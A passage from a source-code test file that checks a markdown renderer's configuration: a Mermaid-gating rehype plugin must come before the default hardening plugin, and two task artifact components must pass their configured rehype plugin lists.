    expect(read("src/lib/streamdown-options.ts")).toMatch(/rehypeGateMermaidBlocks,\s*\n\s*defaultRehypePlugins\.harden/);
    expect(read("src/components/tasks/artifact-panel.tsx")).toContain("rehypePlugins={STREAMDOWN_REHYPE_PLUGINS}");
    expect(read("src/components/tasks/artifact-revision-view.tsx")).toContain("rehypePlugins={REVISION_REHYPE_PLUGINS}");
  });
});
